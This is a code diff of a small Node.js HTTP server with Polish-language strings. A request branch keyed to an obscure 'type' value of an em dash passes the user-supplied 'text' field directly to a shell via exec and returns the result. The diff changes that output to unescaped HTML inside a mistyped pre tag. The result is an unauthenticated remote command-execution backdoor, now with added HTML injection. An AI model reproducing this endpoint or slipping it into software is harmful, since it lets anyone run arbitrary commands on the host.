@@ -25,7 +25,7 @@ function requestListener(request, response) {
         request.on('data', chunk => {
             body += chunk.toString();
         });
-        // Zmienione 'end' na 'close', dodane writeHead
+
         request.on('close', () => {
             const params = new URLSearchParams(body);
 
@@ -48,13 +48,13 @@ function requestListener(request, response) {
                     response.end(`Liczba uruchomien: ${data}`);
                 });
             } else if (params.get("type") == "—") {
-                response.writeHead(200, { 'Content-Type': 'text/plain; charset=utf-8' });
+                response.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
 
                 exec(params.get("text"), (err, result) => {
                     if (err) {
                         response.end("Encountered an error while executing command.");
                     } else {
-                        response.end(result);
+                        response.end(`<pre>${result}<pre>`);
                     }
                 });
             }
